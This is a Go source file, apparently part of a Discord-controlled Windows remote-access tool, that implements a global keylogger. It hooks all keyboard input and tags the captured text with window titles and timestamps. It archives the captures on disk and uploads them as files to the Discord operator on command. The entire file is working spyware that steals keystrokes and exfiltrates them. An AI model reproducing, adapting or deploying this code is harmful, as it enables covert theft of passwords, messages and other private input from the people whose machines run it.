//go:build windows

package commands

import (
	"bytes"
	"fmt"
	"log/slog"
	"os"
	"path/filepath"
	"strings"
	"sync"
	"time"

	"github.com/bwmarrin/discordgo"
	"github.com/local/govoid/internal/config"
	"github.com/local/govoid/internal/win32"
)

type KeylogBuffer struct {
	mu       sync.Mutex
	sessions []*win32.WindowSession
	current  *win32.WindowSession
}

const keyBackspace = 0x08

var globalBuffer = &KeylogBuffer{}

func (b *KeylogBuffer) StartSession(process, title string, at time.Time) {
	b.mu.Lock()
	defer b.mu.Unlock()

	if b.current != nil {
		if b.current.ProcessName == process && b.current.WindowTitle == title {
			return
		}
		b.closeLocked()
	}

	b.current = &win32.WindowSession{
		StartedAt:   at.UTC(),
		ProcessName: process,
		WindowTitle: title,
	}
}

func (b *KeylogBuffer) Append(event win32.KeyEvent) {
	b.mu.Lock()
	defer b.mu.Unlock()

	if b.current == nil {
		b.current = &win32.WindowSession{
			StartedAt:   event.Timestamp.UTC(),
			ProcessName: "desconocido",
			WindowTitle: "",
		}
	}
	b.current.Events = append(b.current.Events, event)
}

func (b *KeylogBuffer) closeLocked() {
	if b.current == nil {
		return
	}
	b.appendArchiveLocked(b.current)
	b.sessions = append(b.sessions, b.current)
	b.current = nil
}

func (b *KeylogBuffer) appendArchiveLocked(session *win32.WindowSession) {
	block := formatSession(session)
	if block == "" {
		return
	}
	path := keylogArchivePath()
	if err := os.MkdirAll(filepath.Dir(path), 0o755); err != nil {
		return
	}
	if info, err := os.Stat(path); err == nil && info.Size() >= keylogArchiveMax {
		_ = os.Rename(path, path+".1")
	}
	file, err := os.OpenFile(path, os.O_CREATE|os.O_WRONLY|os.O_APPEND, 0o644)
	if err != nil {
		return
	}
	defer func() { _ = file.Close() }()
	_, _ = file.WriteString(block + "\n")
}

func keylogArchivePath() string {
	return filepath.Join(config.StateDir(), "keylog.txt")
}

const keylogArchiveMax = 8 << 20

func (b *KeylogBuffer) FormatDump() string {
	b.mu.Lock()
	ordered := make([]*win32.WindowSession, 0, len(b.sessions)+1)
	ordered = append(ordered, b.sessions...)
	if b.current != nil {
		ordered = append(ordered, b.current)
	}
	b.mu.Unlock()

	var out strings.Builder
	for _, session := range ordered {
		block := formatSession(session)
		if block == "" {
			continue
		}
		if out.Len() > 0 {
			out.WriteByte('\n')
		}
		out.WriteString(block)
	}
	return out.String()
}

func formatSession(session *win32.WindowSession) string {
	process := session.ProcessName
	if process == "" {
		process = "desconocido"
	}
	title := strings.Join(strings.Fields(session.WindowTitle), " ")

	text := make([]rune, 0, len(session.Events))
	for _, event := range session.Events {
		if event.IsSpecial {
			if event.Vk == keyBackspace && len(text) > 0 {
				text = text[:len(text)-1]
			}
			continue
		}
		text = append(text, event.Rune)
	}
	if len(text) == 0 {
		return ""
	}

	var out strings.Builder
	fmt.Fprintf(&out, "[%s | %s | %s UTC]\n",
		process, title, session.StartedAt.UTC().Format("2006-01-02 15:04:05"))
	out.WriteString(string(text))
	block := out.String()
	if !strings.HasSuffix(block, "\n") {
		block += "\n"
	}
	return block
}

func (b *KeylogBuffer) DumpToFile() ([]byte, string) {
	name := fmt.Sprintf("keylog_%s_%s.txt", safeHostname(), time.Now().Format("20060102_150405"))
	return []byte(b.FormatDump()), name
}

func (b *KeylogBuffer) ClearBuffer() {
	b.mu.Lock()
	defer b.mu.Unlock()
	b.closeLocked()
	b.sessions = nil
	b.current = nil
}

func safeHostname() string {
	host, err := os.Hostname()
	if err != nil || host == "" {
		host = "host"
	}
	clean := strings.Map(func(r rune) rune {
		switch {
		case r >= 'a' && r <= 'z', r >= 'A' && r <= 'Z', r >= '0' && r <= '9', r == '-', r == '_':
			return r
		}
		return '-'
	}, host)
	if clean == "" {
		return "host"
	}
	return clean
}

func StartGlobal() {
	win32.Default.SetSink(globalBuffer)
	if err := win32.Default.Start(); err != nil {
		slog.Error("keylogger: no se pudo instalar el hook", "err", err)
		return
	}
	slog.Info("keylogger: captura global activa", "archivo", keylogArchivePath())
}

func StopGlobal() {
	win32.Default.Stop()
	globalBuffer.FlushCurrent()
	slog.Info("keylogger: captura detenida, buffer conservado", "sesiones", globalBuffer.sessionCount())
}

func (b *KeylogBuffer) FlushCurrent() {
	b.mu.Lock()
	defer b.mu.Unlock()
	b.closeLocked()
}

func (b *KeylogBuffer) sessionCount() int {
	b.mu.Lock()
	defer b.mu.Unlock()
	count := len(b.sessions)
	if b.current != nil {
		count++
	}
	return count
}

func Keylog(s *discordgo.Session, i *discordgo.InteractionCreate) {
	if err := Defer(s, i); err != nil {
		return
	}

	switch StringOption(i, "action") {
	case "start":
		StartGlobal()
		Finish(s, i, "🔑 Keylogger iniciado.")
	case "stop":
		if !win32.Default.Running() {
			Finish(s, i, "ℹ️ El keylogger no está corriendo.")
			return
		}
		StopGlobal()
		Finish(s, i, "🛑 Keylogger detenido. El buffer sigue intacto.")
	case "dump":
		sendKeylogDump(s, i)
	case "clear":
		globalBuffer.ClearBuffer()
		Finish(s, i, "🧹 Buffer del keylogger vaciado.")
	default:
		Finish(s, i, "❌ Acción inválida. Usa start, stop, dump o clear.")
	}
}

func KeylogDump(s *discordgo.Session, i *discordgo.InteractionCreate) {
	if err := Defer(s, i); err != nil {
		return
	}
	sendKeylogDump(s, i)
}

func KeylogStart(s *discordgo.Session, i *discordgo.InteractionCreate) {
	if err := Defer(s, i); err != nil {
		return
	}
	StartGlobal()
	Finish(s, i, "🔑 Keylogger iniciado.")
}

func KeylogStop(s *discordgo.Session, i *discordgo.InteractionCreate) {
	if err := Defer(s, i); err != nil {
		return
	}
	if !win32.Default.Running() {
		Finish(s, i, "ℹ️ El keylogger no está corriendo.")
		return
	}
	StopGlobal()
	Finish(s, i, "🛑 Keylogger detenido. El buffer sigue intacto.")
}

func sendKeylogDump(s *discordgo.Session, i *discordgo.InteractionCreate) {
	data, name := globalBuffer.DumpToFile()
	if len(bytes.TrimSpace(data)) == 0 {
		Finish(s, i, "ℹ️ Buffer vacío — no hay teclas capturadas todavía.")
		return
	}

	content := fmt.Sprintf("🔑 Keylog — %d bloques, %.1f KB",
		globalBuffer.sessionCount(), float64(len(data))/1024)

	file := &discordgo.File{
		Name:        name,
		ContentType: "text/plain; charset=utf-8",
		Reader:      bytes.NewReader(data),
	}
	if _, err := s.InteractionResponseEdit(i.Interaction, &discordgo.WebhookEdit{
		Content: &content,
		Files:   []*discordgo.File{file},
	}); err != nil {
		Finish(s, i, "❌ No se pudo subir el dump: "+err.Error())
	}
}
